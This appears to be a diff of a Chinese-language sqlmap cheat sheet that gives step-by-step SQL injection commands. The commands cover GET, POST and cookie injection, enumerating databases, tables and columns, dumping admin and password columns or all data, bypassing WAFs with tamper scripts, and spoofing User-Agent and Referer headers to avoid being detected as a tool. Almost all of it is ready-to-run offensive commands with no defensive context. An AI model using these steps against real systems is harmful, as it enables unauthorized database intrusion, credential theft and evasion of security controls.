@@ -1,33 +1,37 @@
-	1. 注入分法不同，种类不同，来个简单的分类：
-		1.get型:        sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx"
-2.post型:       sqlmap -u "http://xxx.xx.xxx/xx.xxx" --data="xxxx=xxxx&xxxx=xxx"
-3.cookie类注入: sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx" --cookie="xxx=xxx&xxx=xxx" --level=2
-	2. 需要数据库
-		--dbs
-	3. 得到数据库名称xxx，需要表： 
-	    -D xxx --tables
-	4. 得到表名xxxx，需要列：
-	    -D xxx -T xxxx --columns
+Sqlmap
+======
+1. 注入分法不同，种类不同，来个简单的分类：<br/>
+
+        1.get型:        sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx"
+        2.post型:       sqlmap -u "http://xxx.xx.xxx/xx.xxx" --data="xxxx=xxxx&xxxx=xxx"
+        3.cookie类注入: sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx" --cookie="xxx=xxx&xxx=xxx" --level=2
+
+2. 需要数据库
+    --dbs
+3. 得到数据库名称xxx，需要表： 
+    -D xxx --tables
+4. 得到表名xxxx，需要列：
+    -D xxx -T xxxx --columns
 		
-		Note:
-				1) 指定列的范围从2－4 : python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0
+	Note:
+           1) 指定列的范围从2－4 : python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0
 			
-	5. 得到列名有admin，password，需要值：
-	    -D xxx -T xxxx -C "admin,password" --dump
+5. 得到列名有admin，password，需要值：
+    -D xxx -T xxxx -C "admin,password" --dump
 		
-		Note:
-				1) --dump-all 导出所有表，所有数据
+	Note:
+	1) --dump-all 导出所有表，所有数据
 				
-	6. 还需要绕waf
-		python sqlmap.py -u "http://192.168.159.1/news.php?id=1" -v 3 --dbs --batch --tamper "space2morehash.py"
-		相同的脚本还有：
+6. 还需要绕waf
+    python sqlmap.py -u "http://192.168.159.1/news.php?id=1" -v 3 --dbs --batch --tamper "space2morehash.py"
+	相同的脚本还有：
 			§ space2morehash.py
 			§ space2hash.py
 			§ base64encode.py
 			§ charencode.py
 		
 		
-	7. 注入被识别出来是工具，断开咋办
+7. 注入被识别出来是工具，断开咋办
 		a. python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3
 		b. python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -a "./txt/user-agents.txt"
 		c. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --referer "http://www.google.com" -v 3
